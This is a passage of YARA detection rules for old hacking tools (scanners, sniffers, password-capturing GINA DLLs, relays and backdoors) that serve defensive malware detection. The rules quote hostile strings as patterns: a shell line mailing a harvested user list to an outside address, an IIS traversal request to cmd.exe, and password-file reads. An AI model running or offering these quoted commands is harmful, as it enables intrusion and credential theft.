		$s11 = "<CENTER><H1>Cerberus Internet Scanner</H1>" fullword ascii
		$s18 = "<P><H3>Account Information</H3><PRE>" fullword wide
		$s19 = "%s's password is %s</H3>" fullword wide
		$s20 = "%s's password is blank</H3>" fullword wide
	condition:
		5 of them
}

rule sig_238_Glass2k {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Glass2k.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "b05455a1ecc6bc7fc8ddef312a670f2013704f1a"
	strings:
		$s0 = "Portions Copyright (c) 1997-1999 Lee Hasiuk" fullword ascii
		$s1 = "C:\\Program Files\\Microsoft Visual Studio\\VB98" fullword ascii
		$s3 = "WINNT\\System32\\stdole2.tlb" fullword ascii
		$s4 = "Glass2k.exe" fullword wide
		$s7 = "NeoLite Executable File Compressor" fullword ascii
	condition:
		all of them
}

rule SplitJoin_V1_3_3_rar_Folder_3 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21409117b536664a913dcd159d6f4d8758f43435"
	strings:
		$s2 = "ie686@sohu.com" fullword ascii
		$s3 = "splitjoin.exe" fullword ascii
		$s7 = "SplitJoin" fullword ascii
	condition:
		all of them
}

rule FPipe2_0 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file FPipe2.0.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "891609db7a6787575641154e7aab7757e74d837b"
	strings:
		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
		$s2 = " -s    - outbound connection source port number" fullword ascii
		$s3 = "source port for that outbound connection being set to 53 also." fullword ascii
		$s4 = "http://www.foundstone.com" fullword ascii
		$s19 = "FPipe" fullword ascii
	condition:
		all of them
}

rule InstGina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InstGina.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5317fbc39508708534246ef4241e78da41a4f31c"
	strings:
		$s0 = "To Open Registry" fullword ascii
		$s4 = "I love Candy very much!!" ascii
		$s5 = "GinaDLL" fullword ascii
	condition:
		all of them
}

rule ArtTray_zip_Folder_ArtTray {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ArtTray.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "ee1edc8c4458c71573b5f555d32043cbc600a120"
	strings:
		$s0 = "http://www.brigsoft.com" fullword wide
		$s2 = "ArtTrayHookDll.dll" fullword ascii
		$s3 = "ArtTray Version 1.0 " fullword wide
		$s16 = "TRM_HOOKCALLBACK" fullword ascii
	condition:
		all of them
}

rule sig_238_findoor {
	meta:
		description = "Disclosed hacktool set (old stuff) - file findoor.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "cdb1ececceade0ecdd4479ecf55b0cc1cf11cdce"
	strings:
		$s0 = "(non-Win32 .EXE or error in .EXE image)." fullword ascii
		$s8 = "PASS hacker@hacker.com" fullword ascii
		$s9 = "/scripts/..%c1%1c../winnt/system32/cmd.exe" fullword ascii
		$s10 = "MAIL FROM:hacker@hacker.com" fullword ascii
		$s11 = "http://isno.yeah.net" fullword ascii
	condition:
		4 of them
}

rule WinEggDropShellFinal_zip_Folder_InjectT {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "516e80e4a25660954de8c12313e2d7642bdb79dd"
	strings:
		$s0 = "Packed by exe32pack" ascii
		$s1 = "2TInject.Dll" fullword ascii
		$s2 = "Windows Services" fullword ascii
		$s3 = "Findrst6" fullword ascii
		$s4 = "Press Any Key To Continue......" fullword ascii
	condition:
		all of them
}

rule gina_zip_Folder_gina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file gina.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e0429e1b59989cbab6646ba905ac312710f5ed30"
	strings:
		$s0 = "NEWGINA.dll" fullword ascii
		$s1 = "LOADER ERROR" fullword ascii
		$s3 = "WlxActivateUserShell" fullword ascii
		$s6 = "WlxWkstaLockedSAS" fullword ascii
		$s13 = "WlxIsLockOk" fullword ascii
		$s14 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s16 = "WlxShutdown" fullword ascii
		$s17 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
	condition:
		all of them
}

rule superscan3_0 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file superscan3.0.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d"
	strings:
		$s0 = "\\scanner.ini" fullword ascii
		$s1 = "\\scanner.exe" fullword ascii
		$s2 = "\\scanner.lst" fullword ascii
		$s4 = "\\hensss.lst" fullword ascii
		$s5 = "STUB32.EXE" fullword wide
		$s6 = "STUB.EXE" fullword wide
		$s8 = "\\ws2check.exe" fullword ascii
		$s9 = "\\trojans.lst" fullword ascii
		$s10 = "1996 InstallShield Software Corporation" fullword wide
	condition:
		all of them
}

rule sig_238_xsniff {
	meta:
		description = "Disclosed hacktool set (old stuff) - file xsniff.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d61d7329ac74f66245a92c4505a327c85875c577"
	strings:
		$s2 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
		$s3 = "%s - simple sniffer for win2000" fullword ascii
		$s4 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
		$s5 = "HOST: %s USER: %s, PASS: %s" fullword ascii
		$s7 = "http://www.xfocus.org" fullword ascii
		$s9 = "  -pass        : Filter username/password" fullword ascii
		$s18 = "  -udp         : Output udp packets" fullword ascii
		$s19 = "Code by glacier <glacier@xfocus.org>" fullword ascii
		$s20 = "  -tcp         : Output tcp packets" fullword ascii
	condition:
		6 of them
}

rule sig_238_fscan {
	meta:
		description = "Disclosed hacktool set (old stuff) - file fscan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d5646e86b5257f9c83ea23eca3d86de336224e55"
	strings:
		$s0 = "FScan v1.12 - Command line port scanner." fullword ascii
		$s2 = " -n    - no port scanning - only pinging (unless you use -q)" fullword ascii
		$s5 = "Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200" fullword ascii
		$s6 = " -z    - maximum simultaneous threads to use for scanning" fullword ascii
		$s12 = "Failed to open the IP list file \"%s\"" fullword ascii
		$s13 = "http://www.foundstone.com" fullword ascii
		$s16 = " -p    - TCP port(s) to scan (a comma separated list of ports/ranges) " fullword ascii
		$s18 = "Bind port number out of range. Using system default." fullword ascii
		$s19 = "fscan.exe" fullword wide
	condition:
		4 of them
}

rule _iissample_nesscan_twwwscan {
	meta:
		description = "Disclosed hacktool set (old stuff) - from files iissample.exe, nesscan.exe, twwwscan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		super_rule = 1
		hash0 = "7f20962bbc6890bf48ee81de85d7d76a8464b862"
		hash1 = "c0b1a2196e82eea4ca8b8c25c57ec88e4478c25b"
		hash2 = "548f0d71ef6ffcc00c0b44367ec4b3bb0671d92f"
	strings:
		$s0 = "Connecting HTTP Port - Result: " fullword
		$s1 = "No space for command line argument vector" fullword
		$s3 = "Microsoft(July/1999~) http://www.microsoft.com/technet/security/current.asp" fullword
		$s5 = "No space for copy of command line" fullword
		$s7 = "-  Windows NT,2000 Patch Method  - " fullword
		$s8 = "scanf : floating point formats not linked" fullword
		$s12 = "hrdir_b.c: LoadLibrary != mmdll borlndmm failed" fullword
		$s13 = "!\"what?\"" fullword
		$s14 = "%s Port %d Closed" fullword
		$s16 = "printf : floating point formats not linked" fullword
		$s17 = "xxtype.cpp" fullword
	condition:
		all of them
}

rule _FsHttp_FsPop_FsSniffer {
	meta:
		description = "Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		super_rule = 1
		hash0 = "9d4e7611a328eb430a8bb6dc7832440713926f5f"
		hash1 = "ae23522a3529d3313dd883727c341331a1fb1ab9"
		hash2 = "7ffc496cd4a1017485dfb571329523a52c9032d8"
	strings:
		$s0 = "-ERR Invalid Command, Type [Help] For Command List" fullword
		$s1 = "-ERR Get SMS Users ID Failed" fullword
		$s2 = "Control Time Out 90 Secs, Connection Closed" fullword
		$s3 = "-ERR Post SMS Failed" fullword
		$s4 = "Current.hlt" fullword
		$s6 = "Histroy.hlt" fullword
		$s7 = "-ERR Send SMS Failed" fullword
		$s12 = "-ERR Change Password <New Password>" fullword
		$s17 = "+OK Send SMS Succussifully" fullword
		$s18 = "+OK Set New Password: [%s]" fullword
		$s19 = "CHANGE PASSWORD" fullword
	condition:
		all of them
}

rule Ammyy_Admin_AA_v3 {
	meta:
		description = "Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe"
		author = "Florian Roth"
		reference = "http://goo.gl/gkAg2E"
		date = "2014/12/22"
		score = 55
		hash1 = "b130611c92788337c4f6bb9e9454ff06eb409166"
		hash2 = "07539abb2623fe24b9a05e240f675fa2d15268cb"
	strings:
		$x1 = "S:\\Ammyy\\sources\\target\\TrService.cpp" fullword ascii
		$x2 = "S:\\Ammyy\\sources\\target\\TrDesktopCopyRect.cpp" fullword ascii
		$x3 = "Global\\Ammyy.Target.IncomePort" fullword ascii
		$x4 = "S:\\Ammyy\\sources\\target\\TrFmFileSys.cpp" fullword ascii
		$x5 = "Please enter password for accessing remote computer" fullword ascii

		$s1 = "CreateProcess1()#3 %d error=%d" fullword ascii
		$s2 = "CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name." fullword ascii
		$s3 = "ERROR: CreateProcessAsUser() error=%d, session=%d" fullword ascii
		$s4 = "ERROR: FindProcessByName('explorer.exe')" fullword ascii
	condition:
		2 of ($x*) or all of ($s*)
}

rule LinuxHacktool_eyes_scanssh {
	meta:
		description = "Linux hack tools - file scanssh"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "467398a6994e2c1a66a3d39859cde41f090623ad"
	strings:
		$s0 = "Connection closed by remote host" fullword ascii
		$s1 = "Writing packet : error on socket (or connection closed): %s" fullword ascii
		$s2 = "Remote connection closed by signal SIG%s %s" fullword ascii
		$s4 = "Reading private key %s failed (bad passphrase ?)" fullword ascii
		$s5 = "Server closed connection" fullword ascii
		$s6 = "%s: line %d: list delimiter not followed by keyword" fullword ascii
		$s8 = "checking for version `%s' in file %s required by file %s" fullword ascii
		$s9 = "Remote host closed connection" fullword ascii
		$s10 = "%s: line %d: bad command `%s'" fullword ascii
		$s13 = "verifying that server is a known host : file %s not found" fullword ascii
		$s14 = "%s: line %d: expected service, found `%s'" fullword ascii
		$s15 = "%s: line %d: list delimiter not followed by domain" fullword ascii
		$s17 = "Public key from server (%s) doesn't match user preference (%s)" fullword ascii
	condition:
		all of them
}

rule LinuxHacktool_eyes_pscan2 {
	meta:
		description = "Linux hack tools - file pscan2"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "56b476cba702a4423a2d805a412cae8ef4330905"
	strings:
		$s0 = "# pscan completed in %u seconds. (found %d ips)" fullword ascii
		$s1 = "Usage: %s <b-block> <port> [c-block]" fullword ascii
		$s3 = "%s.%d.* (total: %d) (%.1f%% done)" fullword ascii
		$s8 = "Invalid IP." fullword ascii
		$s9 = "# scanning: " fullword ascii
		$s10 = "Unable to allocate socket." fullword ascii
	condition:
		2 of them
}

rule LinuxHacktool_eyes_a {
	meta:
		description = "Linux hack tools - file a"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "458ada1e37b90569b0b36afebba5ade337ea8695"
	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "mv scan.log bios.txt" fullword ascii
		$s2 = "rm -rf bios.txt" fullword ascii
		$s3 = "echo -e \"# by Eyes.\"" fullword ascii
		$s4 = "././pscan2 $1 22" fullword ascii
		$s10 = "echo \"#cautam...\"" fullword ascii
	condition:
		2 of them
}

rule LinuxHacktool_eyes_mass {
	meta:
		description = "Linux hack tools - file mass"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "2054cb427daaca9e267b252307dad03830475f15"
	strings:
		$s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
		$s1 = "echo -e \"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\n\\r" ascii
		$s3 = "killall -9 pscan2" fullword ascii
		$s5 = "echo \"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\"" fullword ascii
		$s6 = "echo -e \"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\"" fullword ascii
	condition:
		1 of them
}

rule LinuxHacktool_eyes_pscan2_2 {
	meta:
		description = "Linux hack tools - file pscan2.c"
		author = "Florian Roth"
		reference = "not set"
		date = "2015/01/19"
		hash = "eb024dfb441471af7520215807c34d105efa5fd8"
	strings:
		$s0 = "snprintf(outfile, sizeof(outfile) - 1, \"scan.log\", argv[1], argv[2]);" fullword ascii
		$s2 = "printf(\"Usage: %s <b-block> <port> [c-block]\\n\", argv[0]);" fullword ascii
		$s3 = "printf(\"\\n# pscan completed in %u seconds. (found %d ips)\\n\", (time(0) - sca" ascii
		$s19 = "connlist[i].addr.sin_family = AF_INET;" fullword ascii
		$s20 = "snprintf(last, sizeof(last) - 1, \"%s.%d.* (total: %d) (%.1f%% done)\"," fullword ascii
	condition:
		2 of them
}

rule smsniff_x64_zip_Folder_smsniff {
	meta:
		description = "Network sniffing tool SmartSniff - file smsniff.exe"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015/02/01"
		hash = "5df16d3dbd4eb776ff5a38d2a03a5d74a2b65769"
		score = 60
	strings:
		$s0 = "c:\\Projects\\VS2005\\smsniff\\x64\\Release\\smsniff.pdb" fullword ascii
		$s1 = "Mime\\Database\\Content Type\\%s" fullword ascii
		$s2 = "Packets SummaryCFailed to start capturing packets from the current netwo" wide
		$s3 = "Be aware that Raw Sockets method doesn't work properly on all systems. I" wide
		$s7 = "smsniff.exe" fullword wide
		$s8 = "Exception %8.8X at address %16.16I64X in module %s" fullword ascii
		$s9 = "Retrieve process information while capturing packets" fullword wide
		$s10 = "Software\\NirSoft\\SmartSniff" fullword ascii
		$s14 = "Summary Mode (Don't add a new line for each connection)" fullword wide
		$s17 = "The selected conversation conatins very large packets stream, and the lo" wide
		$s20 = "IPNetInfo.exe" fullword ascii
	condition:
		4 of them
}

rule NetSess_NetSess {
	meta:
		description = "Windows Domains Session Enumerator - used to identify Domain Admin sessions by attacker groups - file NetSess.exe - http://goo.gl/PKnDE2"
		author = "Florian Roth"
		reference = "http://goo.gl/PKnDE2"
		date = "2015/03/10"
		hash = "965013bf24513f9c312db9483f87d3c87e1b77ba"
		score = 70
	strings:
		$s0 = "Invalid argument to operation (see operation documentation)" fullword ascii
		$s1 = "Switches: (designated by - or /)" fullword ascii
		$s2 = "NetSess.exe" fullword ascii
		$s3 = "Enumerating sessions on local host" fullword ascii
		$s4 = "No space for command line argument" fullword ascii
		$s5 = "Joe Richards (joe@joeware.net) " fullword ascii
	condition:
		5 of them
}

/* XFocus.net Toolset ------------------------------------------------------- */

rule CN_Hacktools_sh_utils {
	meta:
		description = "Chinese Hacktool Archive - file sh-utils.pot"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "70d5aa11c89c3ad06b1871696b07c9d5d66f8de5"
	strings:
		$s1 = "msgid \"%s: binary operator expected" fullword ascii
		$s4 = "\"Run COMMAND with an adjusted scheduling priority." fullword ascii
		$s8 = "\"Output who is currently logged in according to FILE." fullword ascii
		$s13 = "\"Run COMMAND with root directory set to NEWROOT." fullword ascii
		$s20 = "\"  -s, --sysname    print the operating system name" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_NetFuke_Modify {
	meta:
		description = "Chinese Hacktool Archive - file NetFuke_Modify.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f580e54c94619ac72ff59c567e53880e4a40bea1"
	strings:
		$s2 = "NetFuke_Modify.dll" fullword ascii
		$s5 = "FromPort = " fullword ascii
		$s6 = "Replace = [*] //" fullword ascii
		$s20 = "DestIP = * //x.x.x.x" fullword ascii
	condition:
		all of them
}
rule CN_Hacktools_srv_inetcmd {
	meta:
		description = "Chinese Hacktool Archive - file srv_inetcmd.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "2a9179c2de095b97d1b8a06a505ba990b9179b84"
	strings:
		$s0 = "Port %d: --> %.200s" fullword ascii
		$s4 = "Map Port -> HTTP Fileserver" fullword ascii
		$s8 = "%.100s[%s] %.100s (%.100s) \"%.100s\"" fullword ascii
		$s9 = "Error starting port service." fullword ascii
		$s18 = "Unable to remove port redirect." fullword ascii
		$s19 = "Map Port -> TCP File Receive" fullword ascii
		$s20 = "Full command line" fullword ascii
	condition:
		5 of them
}

rule CN_Hacktools_WndBreaks {
	meta:
		description = "Chinese Hacktool Archive - file WndBreaks.bas"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "158f38937d649ad4d350df115b817576bfea6d1e"
	strings:
		$s4 = "Declare Function RegCloseKey Lib \"advapi32.dll\" (ByVal hKey As Long) As Long" fullword ascii
		$s11 = "XTEXTS(6) = \"Overlapped Structure At:\" & Hex(XPARAMS(4))" fullword ascii
		$s12 = "Public Function GetFromCLSIDKEY(ByRef CLSIDS As String) As String" fullword ascii
		$s20 = "'APIS.KERNELF.AddInAPI \"Desired Access:\" & Hex(Params(1))" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_rtsort {
	meta:
		description = "Chinese Hacktool Archive - file rtsort.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "027743c8aac8e1b1b25759979884fa9e8d49cead"
	strings:
		$s1 = "by Zhu Shuanglei <shuanglei@hotmail.com>" fullword ascii
		$s2 = "writing sorted segment #%d to temporary file ..." fullword ascii
		$s3 = "failed to create temporary file, %u bytes free disk space required" fullword ascii
		$s5 = "usage: rtsort rainbow_table_filename [-distinct]" fullword ascii
		$s6 = "Hello from MFC!" fullword wide
		$s15 = "writing sorted rainbow table ..." fullword ascii
		$s16 = "sorting rainbow table ..." fullword ascii
	condition:
		5 of them
}

rule CN_Hacktools_UnUpxShell {
	meta:
		description = "Chinese Hacktool Archive - file UnUpxShell.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "bb78381df3511a3128f786b2b12c125f8202c3c8"
	strings:
		$s0 = "\\Release\\Anti_ExeShell.pdb" ascii
		$s4 = "This file not packed by UPX!" fullword ascii
		$s5 = "Not PE file!" fullword ascii
		$s6 = "Usage: UpxDecode FileUpx Unpack" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_rerd {
	meta:
		description = "Chinese Hacktool Archive - file rerd.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c1c428dd429af8c60eb87d0a766e05869ab69171"
	strings:
		$s0 = "Username or password is error." fullword ascii
		$s2 = "Project2.exe" fullword ascii
		$s3 = "E-Mail: lzhabc@21cn.com" fullword ascii
		$s4 = "Enable Remote Desktop Failed." fullword ascii
		$s5 = "rerd ip username password" fullword ascii
		$s6 = "Enable Remote Desktop Ok." fullword ascii
		$s16 = "ostream::sentry *" fullword ascii
	condition:
		6 of them
}
rule CN_Hacktools_wwwbrwchk {
	meta:
		description = "Chinese Hacktool Archive - file wwwbrwchk.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "622b3d9478988f08d6377ae117ae62decf885215"
	strings:
		$s5 = "<PRE><B>Internet Explorer Browser Security Settings for %s</B>" fullword ascii
		$s10 = "Setting: Run ActiveX controls and plug-ins." fullword ascii
		$s13 = "This is set to Administrator approve. Disable instead." fullword ascii
		$s20 = "Set to Automatic logon with current username and password. Set to Prompt." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_RobinPE_new {
	meta:
		description = "Chinese Hacktool Archive - file RobinPE-new.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a159995b287d9863bda19f80b6435cd61280c6f6"
	strings:
		$s1 = "vb6chs.dll" fullword ascii
		$s6 = "EVENT_SINK_" fullword ascii
		$s13 = "R o b i n" fullword ascii
		$s19 = "aboutModule" fullword
	condition:
		all of them
}

rule CN_Hacktools_EXE2HBDO {
	meta:
		description = "Chinese Hacktool Archive - file EXE2HBDO.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "03e977007cc370e731f880d8cc0c27452d4ca46b"
	strings:
		$s3 = "--==E . S . T==--" fullword ascii
		$s4 = "Please input filename:" fullword ascii
		$s5 = "CODE BY EvilHsu " fullword ascii
		$s6 = "WELCOME  TO  E.S.T" fullword ascii
		$s7 = "Exe2 Hex&BIN&DEC&OCT" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_pktfltsrv {
	meta:
		description = "Chinese Hacktool Archive - file pktfltsrv.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e13de86899859b9cbcbf4ec15126699153561c5b"
	strings:
		$s3 = "error: could not create PktFilter key under System\\EventLog\\" fullword ascii
		$s9 = "error: could not open a handle to the Packet Filtering service" fullword ascii
		$s14 = "error: Packet Filtering service installation failed" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_smbrelay {
	meta:
		description = "Chinese Hacktool Archive - file smbrelay.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9d241e54ead43cf4ea4704fa4817b5d768d182cf"
	strings:
		$s0 = "Error %d sending data to relay host from target %s" fullword ascii
		$s6 = "Bound to port %d on address %s relaying for host " fullword ascii
		$s17 = "Error %d receiving data from incoming relay connection to target %s" fullword ascii
		$s18 = "*** Logoff from target %s" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_pktctl_pktctl {
	meta:
		description = "Chinese Hacktool Archive - file pktctl.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "984d9042ece015b819935ad5da5436e44b1dff41"
	strings:
		$s3 = "%s -F filters_file: flush all interfaces and load filters file" fullword ascii
		$s10 = "%s -i : interactive mode" fullword ascii
		$s11 = "error: unable to connect to named pipe" fullword ascii
		$s14 = "lo%d: (%s): %s" fullword ascii
		$s15 = "error: option '-d' accepts exactly two parameters" fullword ascii
		$s20 = "error: option '-F' accepts only one parameter" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_httpdoor {
	meta:
		description = "Chinese Hacktool Archive - file httpdoor.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "47040bdb530380e1596f3045c4992b213bc7800e"
	strings:
		$s1 = "pyedoor.exe" fullword ascii
		$s2 = "prep.bat" fullword ascii
		$s3 = "GETPASSWORD1" fullword wide
		$s5 = "wapi.dll" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_scanrpc {
	meta:
		description = "Chinese Hacktool Archive - file scanrpc.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "47787dee6ddea2cb44ff27b6a5fd729273cea51a"
	strings:
		$s3 = "--- ScanMs Tool --- (c) 2003 Internet Security Systems ---" fullword ascii
		$s8 = "select() err %d (nfds=%d, count=%d)" fullword ascii
		$s10 = "err: max targets exceeded" fullword ascii
		$s13 = "added %d.%d.%d.%d-%d.%d.%d.%d" fullword ascii
		$s14 = "More accurate for WinXP/Win2k, less accurate for WinNT" fullword ascii
		$s20 = "%s [EISCONN] state=%d" fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_SQLOverflowDos {
	meta:
		description = "Chinese Hacktool Archive - file SQLOverflowDos.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f3b0a2e6faa7c32ca08804ef052e14f2c25a5b66"
	strings:
		$s2 = "GetLa2A" fullword ascii
		$s7 = "Emailrefd" fullword ascii
		$s14 = "WideCbrToM" fullword ascii
		$s17 = "(MS02-039)" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_DNS_FP {
	meta:
		description = "Chinese Hacktool Archive - file DNS-FP.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6400581cabbd8555fc671b5c7657de124ee8aeda"
	strings:
		$s0 = "%s-%s.log" fullword ascii
		$s1 = "Open config file error!Check sub.ini" fullword ascii
		$s2 = "Target:%s     Host:%s     IP: %s" fullword ascii
		$s9 = "\\sub.ini" fullword ascii
		$s11 = "Success: %d     Failed: %d" fullword ascii
		$s13 = "Use to dns footprinting, Pen's Testing tool... Write by 7all" fullword wide
		$s14 = "Select Host Commond..." fullword ascii
		$s15 = "DNS FootPrinting [www.cisrg.cn]" fullword wide
		$s16 = "Analyzing finish." fullword ascii
		$s18 = "Not a domain name!" fullword ascii
		$s19 = "www.cisrg.cn" fullword ascii
	condition:
		7 of them
}
rule CN_Hacktools_a8a9_a8a9 {
	meta:
		description = "Chinese Hacktool Archive - file a8a9.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "fea93af60841786688d214017b4f7089c2ce7e5b"
	strings:
		$s3 = "a  --- Output all results" fullword ascii
		$s9 = "Input the file name:" fullword ascii
		$s10 = "Backup MD5 is OK!" fullword ascii
		$s11 = "Check MD5 is OK!" fullword ascii
		$s14 = "a8a9 Version 1.0     2008.04.26" fullword ascii
		$s15 = "Can't Open" fullword ascii
		$s20 = "Backup MD5..." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_ScanWebPath {
	meta:
		description = "Chinese Hacktool Archive - file ScanWebPath.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8e655c7ed1e716a97c9fdae210924b1a79364ee3"
	strings:
		$s8 = "TOPTIONFRM" fullword wide
		$s11 = "TMAINFRM" fullword wide
	condition:
		PEFILE and all of ($s*)
}

rule CN_Hacktools_ModuleASM {
	meta:
		description = "Chinese Hacktool Archive - file ModuleASM.bas"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f429ce7856963c2deaa5d25c54ad386c20886122"
	strings:
		$s0 = "Declare Function GetTickCount Lib \"kernel32\" () As Long" fullword ascii
		$s8 = "'Public Function WordToStr(WORDEX As Long) As String" fullword ascii
		$s9 = "'BTemp = (ActualAdr + DATA + 2) - 256&" fullword ascii
		$s12 = "CopyMemory GetWordFromList, Data(count), 2" fullword ascii
		$s20 = "Public Function Check0(Data() As Byte, ByRef Start As Long, ByRef COMMD As Strin" ascii
	condition:
		all of them
}

rule CN_Hacktools_CGI_Scanner {
	meta:
		description = "Chinese Hacktool Archive - file CGI Scanner.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1a020e6e1fa159a918b8380707bf1772cb6f8d99"
	strings:
		$s1 = "GET /scripts/c32web.exe/ChangeAdminPassword HTTP/1.0" fullword wide
		$s7 = "GET /WebShop/logs/cc.txt HTTP/1.0" fullword wide
		$s20 = "GET /log.nsf HTTP/1.0" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_src_john {
	meta:
		description = "Chinese Hacktool Archive - file john.com"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6413adbf8eb629853067d32743f81119acb233c1"
	strings:
		$s0 = "$Unable to load main program" fullword ascii
		$s1 = "At least a 386 CPU is required" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_SearchTFTP {
	meta:
		description = "Chinese Hacktool Archive - file SearchTFTP.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "26c36959136d1c89c7424f2df084f6e7c82c8db2"
	strings:
		$s0 = "WSAStartup() failed with error %d" fullword ascii
		$s1 = "Use %d milliseconds " fullword ascii
		$s2 = "Use %d seconds " fullword ascii
		$s3 = "From %s To %s" fullword ascii
		$s4 = "socket() error" fullword ascii
		$s5 = "//etc//password" fullword ascii
		$s6 = "End IP : " fullword ascii
		$s7 = "Begin IP : " fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_rpcscan {
	meta:
		description = "Chinese Hacktool Archive - file rpcscan.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "116684ff0a5ad1ef6d251cc587b353381406607e"
	strings:
		$s2 = "<P>Server is running a <B>PORTMAPPER Service</B>.<BR>" fullword ascii
		$s5 = "portmapper" fullword ascii
		$s6 = "Block access to TCP and UDP port 111 at the" ascii
		$s8 = "rpcscan.dll" fullword ascii
		$s14 = "Checking PORTMAPPER service..." fullword ascii
		$s19 = "nispasswd" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_IceSword110 {
	meta:
		description = "Chinese Hacktool Archive - file IceSword110.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "15b79fc12dbac25e21ac8b296bc38d004fd40c8a"
	strings:
